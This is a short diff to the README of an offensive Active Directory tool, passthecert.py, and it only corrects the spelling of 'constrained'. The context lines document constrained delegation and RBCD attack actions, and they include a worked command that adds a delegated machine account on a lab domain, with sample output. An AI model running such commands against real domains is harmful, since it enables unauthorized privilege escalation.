@@ -72,8 +72,8 @@ Actions
   * `modify_computer`: Modify the password of the computer
 
 
-* Contrained delegation attack
-  * `add_computer -delegated-services`: Add a computer configured with contrained delegated services store in `msDS-AllowedToDelegateTo` new computer's attributes.
+* Constrained delegation attack
+  * `add_computer -delegated-services`: Add a computer configured with constrained delegated services store in `msDS-AllowedToDelegateTo` new computer's attributes.
 
 
 * RBCD attack
@@ -113,7 +113,7 @@ Create a computer via LDAPS with custom name and with constrained delegated serv
 $ python3 passthecert.py -action add_computer -crt user.crt -key user.key -domain offsec.local -dc-ip 10.0.0.1 -computer-name OFFSECMACHINE$ -delegated-services cifs/SRV-MAIL.domain.local,ldap/SRV-MAIL.domain.local
 Impacket v0.10.0 - Copyright 2020 SecureAuth Corporation
 
-[+] Adding contrained delegations to the new computer object: cifs/SRV-MAIL.domain.local,ldap/SRV-MAIL.domain.local
+[+] Adding constrained delegations to the new computer object: cifs/SRV-MAIL.domain.local,ldap/SRV-MAIL.domain.local
 [*] Successfully added machine account OFFSECMACHINE$ with password kUwdbHeuTw64QvaLzUYHrjfgE7hrRigS
 ```
 
